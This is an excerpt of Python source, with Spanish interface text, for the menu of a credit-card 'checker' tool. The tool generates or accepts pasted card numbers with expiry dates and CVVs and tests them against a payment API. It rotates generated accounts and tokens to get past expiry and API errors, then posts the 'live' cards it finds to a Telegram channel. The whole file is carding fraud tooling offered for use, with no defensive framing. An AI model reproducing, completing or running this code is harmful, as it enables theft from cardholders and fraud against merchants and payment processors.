...
from main import (
    ...
    MONTOS, API_NO_DISPONIBLE, TOKENS_FILE,
    procesar_tarjetas_pegadas, USED_PHONES,
    flush_lives       # <--- NUEVA IMPORTACIÓN
)
...
def menu_generar():
    ...
    try:
        cantidad = int(input("  Cantidad (1-700): ").strip())
...
def menu_pegar_tarjetas():
    clear()
    console.print(banner())
    console.print("\n  [bold red]PEGAR TARJETAS MANUALMENTE[/bold red]")
    console.print("\n  [dim]Formato: CC|MM|YYYY|CVV (una por línea)[/dim]")
    console.print("  [dim]Ejemplo: 4111111111111111|12|2026|123[/dim]")
    console.print("  [dim]También soporta separadores: coma (,) o espacio[/dim]")
    console.print("  [dim]Escribe FIN en una línea nueva para terminar[/dim]\n")
    ...
    if not lineas:
        console.print("  [red]No se ingresaron tarjetas[/red]")
        input("\n  [Enter para volver]")
        return
    
    tarjetas_texto = "\n".join(lineas)
    tarjetas = procesar_tarjetas_pegadas(tarjetas_texto)
    
    if not tarjetas:
        console.print("  [red]No se procesaron tarjetas válidas[/red]")
        input("\n  [Enter para volver]")
        return
    
    console.print(f"\n  [green]Se procesaron {len(tarjetas)} tarjetas válidas[/green]")
    
    guardar = input("\n  ¿Guardar en combo.txt? (s/n): ").strip().lower()
    if guardar == 's':
        guardar_opcion = input("  ¿Sobrescribir combo.txt? (s/n): ").strip().lower()
        if guardar_opcion == 's':
            guardar_combo(tarjetas)
        else:
            combo_existente = cargar_combo()
            combo_existente.extend(tarjetas)
            guardar_combo(combo_existente)
        console.print("  [green]Tarjetas guardadas en combo.txt[/green]")
    
    iniciar_check = input("\n  ¿Iniciar verificación ahora? (s/n): ").strip().lower()
    if iniciar_check == 's':
        menu_iniciar_con_tarjetas(tarjetas)
    else:
        input("\n  [Enter para volver]")

def menu_iniciar_con_tarjetas(tarjetas=None):
    clear()
    console.print(banner())
    ...
    if tarjetas is None:
        if not os.path.exists("combo.txt") or os.path.getsize("combo.txt") == 0:
            ...
            console.print("  [dim]O usa la opcion 4 para pegar tarjetas manualmente[/dim]")
            input("\n  [Enter para volver]")
            return
        combos = cargar_combo()
    else:
    ...
    # Mostrar pendientes de ejecuciones anteriores
    from publisher import get_pending_count
    pendientes_previas = get_pending_count()
    if pendientes_previas > 0:
        console.print(f"\n  [yellow]⚠ Hay {pendientes_previas} tarjetas pendientes de publicación de ejecuciones anteriores.[/yellow]")
    ...
    console.print(f"  [dim]Tarjetas por cuenta: {TARJETAS_POR_CUENTA_FIJO} (fijo)")
    console.print(f"  [dim]Cuentas a generar: {CUENTAS_FIJAS} (fijo)")
    ...
    log_to_file(f"Tarjetas: {total_tarjetas} | Tarjetas/cuenta: {TARJETAS_POR_CUENTA_FIJO}")
    ...
    if len(tokens) < CUENTAS_FIJAS:
        console.print(f"  [yellow]Advertencia: {len(tokens)} tokens generados de {CUENTAS_FIJAS} solicitados[/yellow]")
    ...
    console.print(f"  [dim]Tarjetas: {total_tarjetas} | Tarjetas/cuenta: {TARJETAS_POR_CUENTA_FIJO}[/dim]\n")
    ...
    while i < total_tarjetas and not api_no_disponible:
        ...
        if tipo == "token_expired":
            token_expirados += 1
            console.print(f"    [yellow]TOKEN EXPIRADO | Cambiando a siguiente cuenta...[/yellow]")
            token_actual = None
        ...
        if tipo == "error" and ("API APAGADA" in detalle or "API NO DISPONIBLE" in detalle):
            ...
            console.print(f"    [yellow]ERROR API ({errores_consecutivos}/{ERRORES_ROTACION})[/yellow]")
            if errores_consecutivos >= ERRORES_ROTACION:
                console.print(f"    [bold red]Forzando rotación de cuenta...[/bold red]")
                token_actual = None
                tarjetas_en_cuenta = TARJETAS_POR_CUENTA_FIJO
                errores_consecutivos = 0
                continue
                ...
                errores_total += 1
                console.print(f"    [red]ERROR | {detalle}[/red]")
    ...
    console.print(f"  [yellow]Tokens expirados: {token_expirados}[/yellow]")
    ...
    # --- INTEGRACIÓN: publicar lives en Telegram ---
    if lives_total > 0:
        console.print("\n  [bold cyan]Enviando tarjetas vivas al canal de Telegram...[/bold cyan]")
        try:
            enviadas = flush_lives()
            if enviadas > 0:
                console.print(f"  [green]✅ Se publicaron {enviadas} tarjetas en el canal.[/green]")
            else:
                console.print("  [yellow]⚠ No se pudo publicar. Revisa el archivo .env y la conexión.[/yellow]")
        except Exception as e:
            console.print(f"  [red]❌ Error al publicar: {e}[/red]")
            log_to_file(f"Error en flush_lives: {e}")
    # -------------------------------------------------
...
def main():
    while True:
        ...
        opciones = [
            ("1", "Generar combo"),
            ("2", "Iniciar Check (desde combo.txt)"),
            ("3", "Revisar BIN"),
            ("4", "Pegar tarjetas manualmente"),
            ("5", "Salir"),
        ]
        for clave, texto in opciones:
            t = Text()
